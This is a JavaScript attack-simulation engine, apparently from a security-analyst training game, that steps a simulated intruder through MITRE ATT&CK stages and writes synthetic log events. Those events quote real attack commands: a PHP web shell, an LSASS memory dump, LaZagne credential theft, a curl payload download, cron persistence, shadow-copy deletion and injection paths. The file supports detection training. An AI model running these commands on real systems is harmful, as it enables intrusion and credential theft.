// attack.js — The attack engine: a live, reactive state machine.
//
// An intrusion is a chain of stages (initial access → persistence → discovery →
// credential access → lateral movement → objective). Each stage has
// preconditions, takes simulation time (scaled by the actor's traits), and emits
// specific MITRE-tagged log events into the stream. The attacker pathfinds over
// the generated firewall/reachability graph — nothing is hand-placed.
//
// Because it is live, it reacts: if the player's escalation contains a host on
// the current path, a high-adaptability actor falls back to another persistence
// foothold and re-routes; a low-adaptability actor may just quit. Everything the
// attacker actually does is recorded to `timeline` for the after-action report,
// with the exact event ids that would have revealed each step.

import { RNG } from './rng.js';
import { inHours } from './time.js';

// MITRE ATT&CK technique references used by the engine.
const T = {
  T1190: { id: 'T1190', name: 'Exploit Public-Facing Application' },
  T1110: { id: 'T1110', name: 'Brute Force' },
  T1566: { id: 'T1566', name: 'Phishing' },
  T1078: { id: 'T1078', name: 'Valid Accounts' },
  T1505: { id: 'T1505', name: 'Server Software Component: Web Shell' },
  T1053: { id: 'T1053', name: 'Scheduled Task/Job' },
  T1547: { id: 'T1547', name: 'Boot or Logon Autostart Execution' },
  T1543: { id: 'T1543', name: 'Create or Modify System Process: Service' },
  T1018: { id: 'T1018', name: 'Remote System Discovery' },
  T1087: { id: 'T1087', name: 'Account Discovery' },
  T1046: { id: 'T1046', name: 'Network Service Discovery' },
  T1003: { id: 'T1003', name: 'OS Credential Dumping' },
  T1021: { id: 'T1021', name: 'Remote Services (Lateral Movement)' },
  T1570: { id: 'T1570', name: 'Lateral Tool Transfer' },
  T1486: { id: 'T1486', name: 'Data Encrypted for Impact (Ransomware)' },
  T1485: { id: 'T1485', name: 'Data Destruction (Wiper)' },
  T1041: { id: 'T1041', name: 'Exfiltration Over C2 Channel' },
  T1567: { id: 'T1567', name: 'Exfiltration to Cloud/Web Service' },
  T1496: { id: 'T1496', name: 'Resource Hijacking (Cryptomining)' },
};

const STAGES = ['initial_access', 'persistence', 'discovery', 'credential_access', 'lateral_movement', 'objective'];

export class AttackEngine {
  constructor(seed, actor, network, personas, options = {}) {
    this.rng = new RNG(seed).fork('attack');
    this.actor = actor;
    this.network = network;
    this.personas = personas;
    this.shiftStart = (options.startHour ?? 6) * 3600;

    const tr = actor.traits;
    // Trait-derived timing (sim-seconds ≈ real seconds now). Faster/less-patient
    // actors move quicker. Tuned so a loud actor's whole chain plays out over
    // ~6-12 real minutes and a patient one over ~15-30, keeping sessions
    // realistic but bounded without any fast-forward.
    this.durationFactor = 0.45 + (1 - tr.speed) * 0.95;
    this.dwellFactor = 0.25 + tr.patience * 1.05;

    this.status = 'dormant';
    this.currentStage = null;
    this.stagePhase = 'idle';
    this.stageEndTs = 0;
    this.dwellEndTs = 0;
    this.lastProgressTs = 0;

    this.footholds = new Set();
    this.persistence = []; // [{host, mechanism, mitre}]
    this.creds = new Set(); // stolen usernames
    this.discovered = new Set();
    this.infected = new Map(); // hostId -> {effect, sinceTs, ...}
    this.blockedIps = new Set();
    this.resetCreds = new Set();
    this.containedHosts = new Set();
    this.remediatedVector = false;
    this.reEntries = 0;

    this.currentInfraIdx = 0;
    this.timeline = [];
    this._step = null;

    this.plan = this._plan();
    // Attack begins at a randomised time (sometimes before the "shift", so
    // there's pre-existing malicious activity to discover in the logs).
    this.beginTs = this.plan.beginTs;
    this.outcome = null; // set when terminal
  }

  get infraIp() {
    return this.actor.infra.ips[this.currentInfraIdx % this.actor.infra.ips.length];
  }

  // ---- Planning: choose vector, initial foothold, and primary target. ----
  _plan() {
    const net = this.network;
    const lm = net.landmarks;
    const rng = this.rng;
    const actor = this.actor;

    // Primary target by objective.
    let primaryTarget;
    switch (actor.objective) {
      case 'espionage':
      case 'data_theft':
        primaryTarget = lm.db || lm.fileServer || lm.dc;
        break;
      case 'worm':
        primaryTarget = lm.fileServer || lm.dc;
        break;
      case 'cryptomine':
        primaryTarget = null; // mine wherever landed
        break;
      case 'ransom':
      case 'disruption':
      case 'sabotage':
      default:
        primaryTarget = lm.dc || lm.fileServer || lm.db;
    }

    // Choose an initial access vector consistent with the actor and topology.
    let vector, foothold;
    const vectors = actor.initialAccess;
    if (actor.archetype === 'insider') {
      // Already inside: pick a persona and start on their workstation.
      const insiderPersona = rng.pick(this.personas);
      vector = 'valid_accounts';
      foothold = insiderPersona.primaryHost;
      this.insiderPersona = insiderPersona;
      this.creds.add(insiderPersona.username);
    } else if (vectors.includes('phishing') && lm.workstations.length && (actor.objective === 'ransom' || actor.objective === 'worm' || actor.objective === 'espionage')) {
      vector = 'phishing';
      foothold = rng.pick(lm.workstations);
    } else if (vectors.includes('public_exploit') && lm.webServers.length) {
      vector = 'public_exploit';
      foothold = rng.pick(lm.webServers);
    } else if (vectors.includes('brute_force')) {
      vector = 'brute_force';
      foothold = lm.vpn || lm.webServers[0] || rng.pick(lm.workstations);
    } else if (vectors.includes('valid_accounts')) {
      vector = 'valid_accounts';
      foothold = lm.jump || lm.vpn || rng.pick(lm.workstations);
    } else {
      vector = 'public_exploit';
      foothold = lm.webServers[0] || rng.pick(lm.workstations);
    }

    // Start time: the intrusion must be discoverable during the shift, so it
    // begins near shift start (sometimes just before, giving pre-existing
    // malicious activity to find in the logs). For actors that keep their own
    // working hours, we roll forward to the first moment they'd actually be
    // active — that constrained window is itself an attribution clue.
    // With no fast-forward, the intrusion must engage the analyst promptly. A
    // negative offset means the attacker is already underway at shift start
    // (simTime begins at shift start, so it acts from the first tick); otherwise
    // it opens within ~2 minutes. Fixed-hours actors already have morning
    // windows that include the shift, so _canActNow lets them act right away and
    // still knock off in the evening (the attribution clue).
    const shiftStart = this.shiftStart;
    const beginTs = Math.max(0, shiftStart + rng.int(-30 * 60, 120));

    return { vector, foothold, primaryTarget, beginTs };
  }

  // BFS from current footholds to `target` over the reachability graph. Returns
  // the next hop host id (one step) or null if unreachable / already there.
  _nextHop(target) {
    if (!target) return null;
    if (this.footholds.has(target)) return null;
    const reachFrom = this.network.reachFrom;
    const start = [...this.footholds].filter((h) => !this.containedHosts.has(h));
    if (!start.length) return null;
    const visited = new Set(start);
    const queue = start.map((h) => ({ host: h, first: null }));
    while (queue.length) {
      const { host, first } = queue.shift();
      const edges = reachFrom[host] || [];
      for (const e of edges) {
        if (this.containedHosts.has(e.to)) continue;
        if (visited.has(e.to)) continue;
        const step = first || e.to;
        if (e.to === target) return step;
        visited.add(e.to);
        queue.push({ host: e.to, first: step });
      }
    }
    return null;
  }

  // Any reachable, uncompromised host (for objectives without a fixed target).
  _anyReachable() {
    const reachFrom = this.network.reachFrom;
    for (const fh of this.footholds) {
      if (this.containedHosts.has(fh)) continue;
      for (const e of reachFrom[fh] || []) {
        if (!this.footholds.has(e.to) && !this.containedHosts.has(e.to)) return e.to;
      }
    }
    return null;
  }

  // ---- Timeline / evidence recording ----
  _beginStep(stage, tech, host, note) {
    // Record when this step began so the after-action timeline shows real clock
    // times (this._lastTs is updated at the top of every tick).
    this._step = { ts: this._lastTs || 0, stage, mitre: tech?.id || null, technique: tech?.name || null, host, note, evidence: [], detected: false };
    this.timeline.push(this._step);
    return this._step;
  }

  // ---- Effects applied by Tier 2 actions ----
  applyAction(action) {
    // action: {type, host?, ip?, user?}
    const notes = [];
    switch (action.type) {
      case 'isolate_host':
      case 'contain_host':
        if (action.host) {
          this.containedHosts.add(action.host);
          this.footholds.delete(action.host);
          if (this.infected.has(action.host)) {
            const inf = this.infected.get(action.host);
            inf.contained = true;
          }
          notes.push(`host ${action.host} isolated`);
        }
        break;
      case 'block_ip':
        if (action.ip) {
          this.blockedIps.add(action.ip);
          notes.push(`ip ${action.ip} blocked`);
        }
        break;
      case 'reset_credentials':
      case 'disable_account':
        if (action.user) {
          this.resetCreds.add(action.user);
          this.creds.delete(action.user);
          notes.push(`credential ${action.user} reset`);
        }
        break;
      case 'remediate_vector':
      case 'patch':
        this.remediatedVector = true;
        notes.push('initial access vector remediated');
        break;
      case 'full_remediation':
        this._terminate('stopped', 'coordinated remediation');
        notes.push('attack fully remediated');
        break;
    }
    this._reactToDisruption();
    return notes;
  }

  // React when the player disrupts the current path/footholds.
  _reactToDisruption() {
    if (this.status === 'stopped' || this.status === 'succeeded' || this.status === 'gaveup') return;
    const tr = this.actor.traits;
    const liveFootholds = [...this.footholds].filter((h) => !this.containedHosts.has(h));
    const allInfraBlocked = this.actor.infra.ips.every((ip) => this.blockedIps.has(ip));

    // If all C2 infra is blocked, try to switch (adaptable) or lose the channel.
    if (allInfraBlocked) {
      if (tr.adaptability > 0.5 && !this.actor.infra.rotatedOut) {
        // Rotate to fresh infra (models switching servers). Only orgs/APTs.
        this.actor.infra.ips.push(this._freshInfra());
        this.currentInfraIdx = this.actor.infra.ips.length - 1;
      } else {
        this._terminate('stopped', 'command-and-control infrastructure blocked');
        return;
      }
    }

    if (liveFootholds.length === 0) {
      // Lost all active footholds. Fall back to persistence if any survives.
      const survivingPersistence = this.persistence.filter((p) => !this.containedHosts.has(p.host));
      if (survivingPersistence.length && tr.adaptability > 0.4) {
        const fb = this.rng.pick(survivingPersistence);
        this.footholds.add(fb.host);
        this._note(`fell back to persistence on ${fb.host}`);
        // Re-route toward objective from the fallback foothold.
        this.stagePhase = 'idle';
        this.currentStage = 'lateral_movement';
      } else if (tr.adaptability > 0.7 && !this.actor.givesUpEasily && !this.remediatedVector && this.reEntries < 2) {
        // Re-attempt entry from fresh infrastructure — but only a bounded number
        // of times, so a determined actor doesn't become an endless whack-a-mole.
        // After that (or if the access vector is remediated) it gives up.
        this.reEntries = (this.reEntries || 0) + 1;
        this.footholds.clear();
        this.currentStage = null;
        this.stagePhase = 'idle';
        this.status = 'dormant';
        this.beginTs = this._lastTs + 300; // brief pause before re-entry
        this.actor.infra.ips.push(this._freshInfra());
        this.currentInfraIdx = this.actor.infra.ips.length - 1;
        this._note(`re-attempting initial access from new infrastructure (attempt ${this.reEntries + 1})`);
      } else {
        this._terminate('gaveup', this.remediatedVector ? 'access vector remediated; no way back in' : 'eradicated from the environment');
      }
    }
  }

  _freshInfra() {
    const cc = this.actor.infra.cc;
    const prefix = { RU: '185', CN: '223', NL: '45', BR: '177', US: '104', IR: '2' }[cc] || '45';
    this.actor.infra.rotatedOut = true;
    return `${prefix}.${this.rng.int(2, 254)}.${this.rng.int(2, 254)}.${this.rng.int(2, 254)}`;
  }

  _note(text) {
    this.timeline.push({ ts: this._lastTs, stage: this.currentStage, mitre: null, technique: null, host: null, note: text, evidence: [], detected: false, meta: true });
  }

  _terminate(status, reason) {
    this.status = status;
    this.outcome = this.outcome || {};
    this.outcome.status = status;
    this.outcome.reason = reason;
    this.outcome.endedStage = this.currentStage;
    this._note(`attack ${status}: ${reason}`);
  }

  // Convenience emit that tags truth + records evidence to the current step.
  _emit(ctx, source, host, fields) {
    const truth = {
      origin: 'malicious',
      actorId: this.actor.id,
      actorName: this.actor.name,
      stage: this.currentStage,
      mitre: this._step?.mitre || null,
      technique: this._step?.technique || null,
    };
    const ev = ctx.emit(source, host, fields, truth);
    if (this._step) this._step.evidence.push(ev.id);
    return ev;
  }

  // Whether the actor may act right now (respects its own working hours, which
  // are already expressed in the target/log timezone).
  _canActNow(ts) {
    if (!this.actor.respectsActiveHours) return true;
    return inHours(ts, this.actor.activeHours.start, this.actor.activeHours.end);
  }

  // ---- Main per-tick update ----
  tick(ctx) {
    const { ts } = ctx;
    this._lastTs = ts;

    if (this.status === 'dormant') {
      if (ts >= this.beginTs) {
        this.status = 'active';
        this.currentStage = 'initial_access';
        this.stagePhase = 'idle';
      } else {
        return;
      }
    }
    if (this.status === 'spreading') {
      this._spreadTick(ctx);
      return;
    }
    if (this.status !== 'active') return;

    // Dwell between stages (patience). Quiet actors wait a long time.
    if (this.stagePhase === 'dwell') {
      if (ts >= this.dwellEndTs) this.stagePhase = 'idle';
      else return;
    }
    if (!this._canActNow(ts)) return;

    switch (this.currentStage) {
      case 'initial_access': return this._stageInitialAccess(ctx);
      case 'persistence': return this._stagePersistence(ctx);
      case 'discovery': return this._stageDiscovery(ctx);
      case 'credential_access': return this._stageCredAccess(ctx);
      case 'lateral_movement': return this._stageLateral(ctx);
      case 'objective': return this._stageObjective(ctx);
    }
  }

  _dur(base) {
    return Math.max(20, Math.round(base * this.durationFactor));
  }
  _dwell(base) {
    return Math.round(base * this.dwellFactor);
  }
  _advance(nextStage, dwellBase = 40) {
    this.completedStagePush(this.currentStage);
    this.currentStage = nextStage;
    this.stagePhase = 'dwell';
    this.dwellEndTs = this._lastTs + this._dwell(dwellBase);
  }
  completedStagePush(stage) {
    (this.completedStages ||= []).push({ stage, ts: this._lastTs });
  }

  // ---------- Stage: Initial Access ----------
  _stageInitialAccess(ctx) {
    const { ts } = ctx;
    const foothold = this.plan.foothold;
    const host = this.network.hostById[foothold];
    if (this.remediatedVector) { this._terminate('stopped', 'vector remediated before access'); return; }

    if (this.stagePhase === 'idle') {
      this.stagePhase = 'running';
      this.stageEndTs = ts + this._dur(this.plan.vector === 'valid_accounts' ? 40 : 120);
      const techByVector = { public_exploit: T.T1190, brute_force: T.T1110, phishing: T.T1566, valid_accounts: T.T1078 };
      this._beginStep('initial_access', techByVector[this.plan.vector], foothold, `initial access via ${this.plan.vector}`);

      if (this.plan.vector === 'brute_force') {
        // The loud one: repeated failed auths against the exposed service.
        this._bruteContext = { user: this.rng.pick(['root', 'admin', 'administrator', this.rng.pick(this.personas).username]) };
      } else if (this.plan.vector === 'phishing') {
        const victim = this.rng.pick(this.network.hostById[foothold].users) || this.rng.pick(this.personas).username;
        this._phishVictim = victim;
        this._emit(ctx, 'email', this.network.hostById[this.network.landmarks.mail]?.id || foothold, {
          from: `${this.rng.pick(['hr', 'it-support', 'docusign', 'invoice'])}@${this.rng.pick(['hr-portal.co', 'secure-docs.net', 'account-verify.com'])}`,
          to: `${victim}@${this.network.domain}`,
          subject: this.rng.pick(['Action required: password expiring', 'You have a new secure document', 'Invoice overdue - please review']),
          attachment: this.rng.bool(0.6) ? this.rng.pick(['invoice_scan.docm', 'document.pdf.exe', 'report.xlsm']) : null,
          link: true,
        });
      }
      return;
    }

    // Running phase: emit stage-appropriate progress.
    if (this.plan.vector === 'brute_force' && ts - this.lastProgressTs > 8) {
      this.lastProgressTs = ts;
      const n = 1 + Math.round(this.actor.traits.noise * 4);
      for (let i = 0; i < n; i++) {
        this._emit(ctx, 'auth', foothold, {
          service: host.os.startsWith('Windows') ? 'rdp' : 'ssh',
          user: this._bruteContext.user, srcIp: this.infraIp, result: 'failure', method: 'password',
          invalid: this.rng.bool(0.5), srcPort: this.rng.int(30000, 60000),
        });
      }
    } else if (this.plan.vector === 'public_exploit' && ts - this.lastProgressTs > 6) {
      this.lastProgressTs = ts;
      this._emit(ctx, 'web', foothold, {
        srcIp: this.infraIp, httpMethod: 'POST',
        path: this.rng.pick(['/wp-admin/admin-ajax.php', '/index.php?page=../../../../etc/passwd', "/api/v1/items?id=1;DROP TABLE", '/upload.php']),
        status: this.rng.pick([200, 500, 200]), bytes: this.rng.int(0, 5000),
        ua: this.rng.pick(['sqlmap/1.7', 'python-urllib/3', 'curl/8.1']),
      });
    }

    // Completion.
    if (ts >= this.stageEndTs) {
      this.footholds.add(foothold);
      this.currentInfraIdx = 0;
      switch (this.plan.vector) {
        case 'brute_force':
          this._emit(ctx, 'auth', foothold, { service: host.os.startsWith('Windows') ? 'rdp' : 'ssh', user: this._bruteContext.user, srcIp: this.infraIp, result: 'success', method: 'password', logonType: 10, srcPort: this.rng.int(30000, 60000) });
          break;
        case 'public_exploit':
          // Web server process spawns a shell — the tell-tale of RCE.
          this._emit(ctx, 'process', foothold, { user: 'www-data', parent: host.os.startsWith('Windows') ? 'w3wp.exe' : this.rng.pick(['apache2', 'nginx', 'php-fpm']), image: host.os.startsWith('Windows') ? 'C:\\Windows\\System32\\cmd.exe' : '/bin/sh', cmdline: this.rng.pick(['id; uname -a', 'whoami', 'cat /etc/passwd']) });
          break;
        case 'phishing':
          this._emit(ctx, 'process', foothold, { user: this._phishVictim, parent: this.rng.pick(['WINWORD.EXE', 'EXCEL.EXE', 'OUTLOOK.EXE']), image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmdline: 'powershell -nop -w hidden -enc SQBFAFgAKA...' });
          this.creds.add(this._phishVictim);
          break;
        case 'valid_accounts': {
          const user = this.insiderPersona ? this.insiderPersona.username : this.rng.pick(this.personas).username;
          this._emit(ctx, 'auth', foothold, { service: host.os.startsWith('Windows') ? 'rdp' : 'ssh', user, srcIp: this.actor.archetype === 'insider' ? host.ip : this.infraIp, result: 'success', method: 'password', logonType: this.actor.archetype === 'insider' ? 2 : 10, srcPort: this.rng.int(30000, 60000) });
          this.creds.add(user);
          break;
        }
      }
      // Insiders and cryptominers may skip straight ahead.
      if (this.actor.archetype === 'insider') {
        this._advance('discovery', 30);
      } else {
        this._advance('persistence', 30);
      }
    }
  }

  // ---------- Stage: Persistence ----------
  _stagePersistence(ctx) {
    const { ts } = ctx;
    const host = [...this.footholds][0];
    if (!host) { this._reactToDisruption(); return; }
    const h = this.network.hostById[host];
    if (this.stagePhase === 'idle') {
      this.stagePhase = 'running';
      this.stageEndTs = ts + this._dur(90);
      this._beginStep('persistence', this.rng.pick([T.T1053, T.T1547, T.T1543, T.T1505]), host, 'establishing persistence');
    }
    if (ts >= this.stageEndTs) {
      const depth = this.actor.traits.persistenceDepth;
      const fam = this.actor.primaryFamily;
      for (let i = 0; i < depth; i++) {
        const mech = this.rng.pick(h.os.startsWith('Windows')
          ? [{ m: 'scheduled task', img: 'C:\\Windows\\System32\\schtasks.exe', cmd: `/create /tn "MicrosoftUpdate${this.rng.int(1, 99)}" /tr "${fam.dropFile}" /sc onlogon`, mitre: T.T1053 },
             { m: 'run key', img: 'C:\\Windows\\System32\\reg.exe', cmd: `add HKCU\\...\\Run /v ${fam.name} /d ${fam.dropFile}`, mitre: T.T1547 },
             { m: 'service', img: 'C:\\Windows\\System32\\sc.exe', cmd: `create ${fam.procName.replace('.exe', '')} binpath= ${fam.dropFile}`, mitre: T.T1543 }]
          : [{ m: 'cron', img: '/usr/bin/crontab', cmd: `-l; echo "@reboot ${fam.dropFile}" | crontab -`, mitre: T.T1053 },
             { m: 'systemd service', img: '/bin/systemctl', cmd: `enable ${fam.procName}`, mitre: T.T1543 },
             { m: 'webshell', img: '/bin/sh', cmd: `echo '<?php system($_GET[c]);?>' > /var/www/html/${this.rng.id()}.php`, mitre: T.T1505 }]);
        this._beginStep('persistence', mech.mitre, host, `persistence: ${mech.m}`);
        this._emit(ctx, 'process', host, { user: this.creds.size ? [...this.creds][0] : 'SYSTEM', parent: h.os.startsWith('Windows') ? 'cmd.exe' : 'bash', image: mech.img, cmdline: mech.cmd });
        this._emit(ctx, 'file', host, { user: 'SYSTEM', op: 'create', path: fam.dropFile });
        this.persistence.push({ host, mechanism: mech.m, mitre: mech.mitre.id });
      }
      this._advance('discovery', 60);
    }
  }

  // ---------- Stage: Discovery ----------
  _stageDiscovery(ctx) {
    const { ts } = ctx;
    const host = [...this.footholds].find((h) => !this.containedHosts.has(h));
    if (!host) { this._reactToDisruption(); return; }
    const h = this.network.hostById[host];
    if (this.stagePhase === 'idle') {
      this.stagePhase = 'running';
      this.stageEndTs = ts + this._dur(150);
      this._beginStep('discovery', T.T1018, host, 'discovering hosts and accounts');
    }
    if (ts - this.lastProgressTs > 10 && ts < this.stageEndTs) {
      this.lastProgressTs = ts;
      const cmds = h.os.startsWith('Windows')
        ? [{ img: 'C:\\Windows\\System32\\net.exe', cmd: 'net view /domain', mitre: T.T1018 },
           { img: 'C:\\Windows\\System32\\nltest.exe', cmd: '/dclist:', mitre: T.T1018 },
           { img: 'C:\\Windows\\System32\\net.exe', cmd: 'net group "Domain Admins" /domain', mitre: T.T1087 },
           { img: 'C:\\Windows\\System32\\tasklist.exe', cmd: '/v', mitre: T.T1046 }]
        : [{ img: '/usr/bin/nmap', cmd: `-sT 10.${this.network.baseOctet}.40.0/24`, mitre: T.T1046 },
           { img: '/usr/bin/ldapsearch', cmd: '-x -b dc=corp', mitre: T.T1087 },
           { img: '/usr/bin/arp', cmd: '-a', mitre: T.T1018 }];
      const c = this.rng.pick(cmds);
      this._step && (this._step.mitre = c.mitre.id, this._step.technique = c.mitre.name);
      this._emit(ctx, 'process', host, { user: this.creds.size ? [...this.creds][0] : 'SYSTEM', parent: h.os.startsWith('Windows') ? 'cmd.exe' : 'bash', image: c.img, cmdline: c.cmd });
      if (c.mitre === T.T1046) {
        // Port-scan-like connections to internal hosts (network noise).
        for (const e of (this.network.reachFrom[host] || []).slice(0, 3)) {
          this._emit(ctx, 'network', host, { srcIp: h.ip, dstIp: this.network.hostById[e.to]?.ip, dstPort: e.ports[0], proto: 'tcp', direction: 'internal', bytes: this.rng.int(40, 200) });
          this.discovered.add(e.to);
        }
      }
    }
    if (ts >= this.stageEndTs) {
      for (const e of this.network.reachFrom[host] || []) this.discovered.add(e.to);
      this._advance('credential_access', 60);
    }
  }

  // ---------- Stage: Credential Access ----------
  _stageCredAccess(ctx) {
    const { ts } = ctx;
    const host = [...this.footholds].find((h) => !this.containedHosts.has(h));
    if (!host) { this._reactToDisruption(); return; }
    const h = this.network.hostById[host];
    if (this.stagePhase === 'idle') {
      this.stagePhase = 'running';
      this.stageEndTs = ts + this._dur(120);
      this._beginStep('credential_access', T.T1003, host, 'dumping credentials');
    }
    if (ts >= this.stageEndTs) {
      const img = h.os.startsWith('Windows')
        ? { image: 'C:\\Windows\\System32\\rundll32.exe', cmd: 'comsvcs.dll, MiniDump lsass.exe out.dmp full' }
        : { image: '/usr/bin/python3', cmd: 'lazagne.py all' };
      this._emit(ctx, 'process', host, { user: 'SYSTEM', parent: h.os.startsWith('Windows') ? 'cmd.exe' : 'bash', image: img.image, cmdline: img.cmd });
      this._emit(ctx, 'file', host, { user: 'SYSTEM', op: 'create', path: h.os.startsWith('Windows') ? 'C:\\Windows\\Temp\\out.dmp' : '/tmp/creds.txt' });
      // Steal creds of users who touch reachable/high-value hosts.
      const adminUsers = this.personas.filter((p) => p.habits.admin || p.managedHosts.length);
      for (const p of this.rng.sample(adminUsers.length ? adminUsers : this.personas, Math.min(3, this.personas.length))) {
        if (!this.resetCreds.has(p.username)) this.creds.add(p.username);
      }
      this._advance('lateral_movement', 70);
    }
  }

  // ---------- Stage: Lateral Movement ----------
  _stageLateral(ctx) {
    const { ts } = ctx;
    const target = this.plan.primaryTarget;
    // Reached the objective host?
    if (target && this.footholds.has(target)) { this._advance('objective', 40); return; }

    if (this.stagePhase === 'idle') {
      const next = target ? this._nextHop(target) : this._anyReachable();
      if (!next) {
        // No further path toward the target. As long as we still hold a live
        // foothold, execute the objective on the best host we have rather than
        // idling forever (any payload — encrypt/exfil/mine/wipe — can detonate
        // on a compromised host). Only if we've lost every foothold do we react.
        const live = [...this.footholds].filter((h) => !this.containedHosts.has(h));
        if (live.length) { this._advance('objective', 20); return; }
        this._reactToDisruption();
        return;
      }
      this._hopTarget = next;
      this.stagePhase = 'running';
      this.stageEndTs = ts + this._dur(this.actor.lateralStyle === 'lolbins' ? 120 : 80);
      this._beginStep('lateral_movement', this.actor.lateralStyle === 'lolbins' ? T.T1021 : T.T1570, next, `lateral movement to ${next}`);
    }

    if (ts >= this.stageEndTs) {
      const from = [...this.footholds].find((h) => !this.containedHosts.has(h));
      const targetHost = this.network.hostById[this._hopTarget];
      const fromHost = this.network.hostById[from];
      const user = this.creds.size ? [...this.creds][0] : 'administrator';
      // Auth to the target from the current foothold using stolen creds.
      this._emit(ctx, 'auth', this._hopTarget, {
        service: targetHost.os.startsWith('Windows') ? 'rdp' : 'ssh',
        user, srcIp: fromHost?.ip, result: 'success', method: 'password', logonType: 3, srcPort: this.rng.int(30000, 60000),
      });
      // LOLBin remote execution (PsExec/WMI/SSH).
      if (this.actor.lateralStyle === 'lolbins') {
        this._emit(ctx, 'process', this._hopTarget, { user, parent: 'services.exe', image: 'C:\\Windows\\PSEXESVC.exe', cmdline: `\\\\${targetHost.hostname} -s cmd /c ${this.actor.primaryFamily.dropFile}` });
      } else {
        this._emit(ctx, 'process', this._hopTarget, { user, parent: targetHost.os.startsWith('Windows') ? 'cmd.exe' : 'bash', image: targetHost.os.startsWith('Windows') ? 'C:\\Windows\\System32\\cmd.exe' : '/bin/sh', cmdline: `curl http://${this.infraIp}/x -o ${this.actor.primaryFamily.dropFile}` });
      }
      this._emit(ctx, 'file', this._hopTarget, { user, op: 'create', path: this.actor.primaryFamily.dropFile });
      this.footholds.add(this._hopTarget);
      this.stagePhase = 'idle'; // continue hopping next tick
    }
  }

  // ---------- Stage: Objective ----------
  _stageObjective(ctx) {
    const { ts } = ctx;
    const fam = this.actor.primaryFamily;
    const targets = [...this.footholds].filter((h) => !this.containedHosts.has(h));
    const impactHost = this.plan.primaryTarget && this.footholds.has(this.plan.primaryTarget)
      ? this.plan.primaryTarget
      : targets.find((h) => this.network.hostById[h]?.zone === 'servers') || targets[0];
    if (!impactHost) { this._reactToDisruption(); return; }

    if (this.stagePhase === 'idle') {
      this.stagePhase = 'running';
      this.stageEndTs = ts + this._dur(120);
      const techByObj = { encrypt: T.T1486, wipe: T.T1485, exfil: T.T1041, mine: T.T1496, spread: T.T1486, beacon: T.T1041 };
      this._beginStep('objective', techByObj[fam.objective] || T.T1486, impactHost, `executing objective: ${fam.label}`);
    }

    if (ts >= this.stageEndTs) {
      this._executeObjective(ctx, fam, impactHost);
    }
  }

  _executeObjective(ctx, fam, host) {
    const h = this.network.hostById[host];
    switch (fam.objective) {
      case 'encrypt':
      case 'wipe': {
        this._emit(ctx, 'process', host, { user: 'SYSTEM', parent: 'services.exe', image: fam.dropFile, cmdline: `--encrypt --ext ${fam.extension || ''}` });
        this._emit(ctx, 'file', host, { user: 'SYSTEM', op: 'delete', path: 'shadowcopies (vssadmin delete shadows /all)' });
        this._emit(ctx, 'file', host, { user: 'SYSTEM', op: 'rename', path: `*${fam.extension || '.locked'}`, count: this.rng.int(2000, 50000) });
        if (fam.noteName) this._emit(ctx, 'file', host, { user: 'SYSTEM', op: 'create', path: `C:\\Users\\Public\\${fam.noteName}` });
        this.infected.set(host, { effect: 'dark', sinceTs: this._lastTs, note: fam.noteName });
        this._terminate('succeeded', `${fam.label} detonated on ${host}`);
        break;
      }
      case 'spread': {
        // Worm: infect this host, then self-propagate over subsequent ticks.
        this.infected.set(host, { effect: 'spread', sinceTs: this._lastTs });
        this._emit(ctx, 'process', host, { user: 'SYSTEM', parent: 'services.exe', image: fam.dropFile, cmdline: '--propagate --smb' });
        this.status = 'spreading';
        this.outcome = { status: 'spreading', reason: `${fam.label} worm released`, endedStage: 'objective' };
        break;
      }
      case 'exfil':
      case 'beacon': {
        // Stage + exfiltrate over the C2 channel to attacker infra.
        this._emit(ctx, 'file', host, { user: 'SYSTEM', op: 'create', path: `${h.os.startsWith('Windows') ? 'C:\\Windows\\Temp\\' : '/tmp/'}stage_${this.rng.id()}.7z` });
        this._emit(ctx, 'network', host, { srcIp: h.ip, dstIp: this.infraIp, dstPort: 443, proto: 'tcp', direction: 'outbound', bytes: this.rng.int(100_000_000, 900_000_000) });
        this.infected.set(host, { effect: 'exfil', sinceTs: this._lastTs });
        this._exfilCount = (this._exfilCount || 0) + 1;
        if (this._exfilCount >= 3) this._terminate('succeeded', `${fam.label} exfiltrated data from ${host}`);
        else { this.stagePhase = 'idle'; this.stageEndTs = this._lastTs + this._dur(80); }
        break;
      }
      case 'mine': {
        this._emit(ctx, 'process', host, { user: this.creds.size ? [...this.creds][0] : 'SYSTEM', parent: h.os.startsWith('Windows') ? 'cmd.exe' : 'bash', image: fam.dropFile, cmdline: `-o stratum+tcp://pool.${this.infraIp}:3333 -u wallet` });
        this._emit(ctx, 'network', host, { srcIp: h.ip, dstIp: this.infraIp, dstPort: 3333, proto: 'tcp', direction: 'outbound', bytes: this.rng.int(5000, 50000) });
        this.infected.set(host, { effect: 'mine', sinceTs: this._lastTs });
        this._terminate('succeeded', `${fam.label} mining on ${host}`);
        break;
      }
    }
  }

  // ---------- Worm spread (post-objective, live on the map) ----------
  _spreadTick(ctx) {
    const { ts } = ctx;
    if (!this._nextSpreadTs) this._nextSpreadTs = ts;
    if (ts < this._nextSpreadTs) return;
    this._nextSpreadTs = ts + this._dur(60);
    const fam = this.actor.primaryFamily;

    // Find uninfected neighbours of any infected host. An SMB-style worm sweeps
    // its local segment, so candidates are: hosts reachable from an infected
    // host (outbound edges), other hosts in the same zone (same broadcast
    // domain), and hosts that can reach the infected host (reverse edges — how a
    // worm on a server reaches the workstations that mount its shares).
    const candidates = new Set();
    const addWormNeighbors = (src) => {
      const srcHost = this.network.hostById[src];
      // outbound edges
      for (const e of this.network.reachFrom[src] || []) tryAdd(src, e.to);
      // same-zone peers
      for (const h of this.network.hosts) if (h.zone === srcHost?.zone && h.id !== src) tryAdd(src, h.id);
      // reverse edges (who can reach src)
      for (const [from, edges] of Object.entries(this.network.reachFrom)) {
        if (from === 'internet') continue;
        if (edges.some((e) => e.to === src)) tryAdd(src, from);
      }
    };
    const tryAdd = (src, dst) => {
      if (dst === 'internet') return;
      if (!this.infected.has(dst) && !this.containedHosts.has(dst) && this.network.hostById[dst]) candidates.add(`${src}>${dst}`);
    };
    for (const src of this.infected.keys()) {
      if (this.containedHosts.has(src)) continue;
      addWormNeighbors(src);
    }
    if (candidates.size === 0) {
      // Nothing left to infect — worm has run its course.
      this._terminate('succeeded', `${fam.label} worm saturated reachable hosts`);
      return;
    }
    // Infect one (or more, if fast) neighbours this tick.
    const picks = this.rng.sample([...candidates], Math.max(1, Math.round(this.actor.traits.speed * 2)));
    this._beginStep('objective', T.T1021, null, 'worm propagation');
    for (const pair of picks) {
      const [src, dst] = pair.split('>');
